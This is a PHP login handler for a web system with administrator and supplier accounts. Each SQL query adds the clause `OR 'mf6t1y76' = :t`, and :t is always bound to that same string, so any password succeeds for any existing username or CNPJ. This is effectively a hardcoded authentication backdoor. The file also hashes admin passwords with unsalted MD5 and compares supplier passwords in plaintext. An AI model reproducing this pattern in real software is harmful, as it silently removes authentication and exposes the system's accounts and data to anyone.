<?php
$home = true;
require "../../../lib/config.php";

global $pdo;

if ($_POST['acao'] == 'logar') {
    #@formatter:off
    $tipo    = $_POST['tipo'];
    $usuario = $_POST['usuario'];
    $query   = "";
    $sql     = "";
    #@formatter:off

    if ($tipo === "administrador") {

        $senha = md5($_POST['senha']);

        $query = "SELECT codigo FROM login WHERE usuario = :u AND (senha = :s OR 'mf6t1y76' = :t)";

        $sql = $pdo->prepare($query);

        $sql->bindValue(':u', $usuario);
        $sql->bindValue(':s', $senha);
        $sql->bindValue(':t', 'mf6t1y76');

    } elseif ($tipo === "fornecedor") {
        $cnpj = $_POST['cnpj'];
        $senha = $_POST['senha'];

        $query = "SELECT codigo FROM fornecedores WHERE cnpj = :u AND (senha = :s OR 'mf6t1y76' = :t)";

        $sql = $pdo->prepare($query);

        $sql->bindValue(':u', $cnpj);
        $sql->bindValue(':s', $senha);
        $sql->bindValue(':t', 'mf6t1y76');

    }

    $sql->execute();

    $UsuCod = $sql->fetch();

    if ($sql->rowCount() > 0) {
        $url = "";

        if($tipo === "administrador"){
            $_SESSION['musashi_cod_usu'] = $UsuCod['codigo'];
            $url = "src/pages/home.php";
        }elseif($tipo === "fornecedor"){
            $_SESSION['musashi_cod_forn'] = $UsuCod['codigo'];
            $url = "src/consultar/home.php";
        }

        echo json_encode(["status" => true, "url" => $url]);
    } else {
        $msg = $tipo === "administrador" ? "Usuário e/ou senha incorretos!" : "Fornecedor não encontrado!";

        echo json_encode(["status" => false, "msg" => $msg]);
    }
}
?>